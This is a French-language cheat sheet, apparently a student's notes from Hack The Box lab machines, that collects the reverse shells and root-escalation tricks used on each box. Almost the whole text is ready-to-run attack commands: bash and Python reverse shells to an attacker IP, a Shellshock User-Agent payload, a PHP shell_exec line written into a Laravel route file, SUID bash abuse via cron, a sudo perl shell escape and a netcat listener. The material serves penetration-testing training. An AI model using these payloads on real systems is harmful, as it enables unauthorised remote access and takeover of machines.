## Récapitulatif — Reverse Shells utilisés 🎯
ref : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
---

## Shells pour accès initial

### PHP — Pentestmonkey
```php
# Fichier complet à télécharger et modifier
# https://github.com/pentestmonkey/php-reverse-shell
# Modifier : $ip = 'TON_IP'; $port = 4444;
```
**Utilisé sur** : Nibbles (upload plugin)

---

### Bash — /dev/tcp
```bash
bash -i >& /dev/tcp/IP_KALI/4444 0>&1
```
**Utilisé sur** : Bashed, Cronos (command injection)

---

### Python3
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```
**Utilisé sur** : Bashed (webshell limité)

---

### Curl — Shellshock (Header injection)
```bash
curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/IP_KALI/4444 0>&1" http://IP/cgi-bin/script.sh
```
**Utilisé sur** : Shocker

---

### PHP — shell_exec (injection dans fichier)
```php
<?php shell_exec("bash -i >& /dev/tcp/IP_KALI/4444 0>&1");?>
# Redirection pour avoir un nouveau shell avec les droits directs
echo '<?php shell_exec("bash -i >& /dev/tcp/10.10.17.68/5555 0>&1");?>' > /var/www/laravel/routes/console.php
```
**Utilisé sur** : Cronos (cron Laravel)

---

## Shells pour passer root

### SUID bash — Cron/Sudo abuse
```bash
# Injection dans script exécuté par root
chmod u+s /bin/bash          # via Python : os.system("chmod u+s /bin/bash")
                             # via PHP    : shell_exec("chmod u+s /bin/bash");
                             # via bash   : echo dans script .sh

# Après exécution par root
/bin/bash -p
whoami  # → root
```
**Utilisé sur** : Bashed, Nibbles, Cronos

---

### GTFOBins — Sudo perl
```bash
sudo perl -e 'exec "/bin/sh"'
```
**Utilisé sur** : Shocker

---

### VNC tunnel — Service root
```bash
# Tunnel SSH
ssh -L 5901:127.0.0.1:5901 user@IP

# Connexion VNC avec fichier secret
vncviewer -passwd secret 127.0.0.1:5901
```
**Utilisé sur** : Poison

---

### Tmux attach — Session root active
```bash
tmux -S /.devs/dev_sess attach
```
**Utilisé sur** : Valentine

---

## Listener universel
```bash
nc -lvnp 4444
```

---

## Règle générale

```
Accès initial    → reverse shell vers ton Kali
Privesc SUID     → chmod u+s /bin/bash → /bin/bash -p
Privesc sudo     → GTFOBins → sudo BINAIRE
Privesc cron     → modifier script → reverse shell ou SUID
Privesc service  → tunnel + connexion service root
```

**Garde ça dans ta cheatsheet — c'est le cœur de 80% des machines HTB Easy/Medium !** 💪
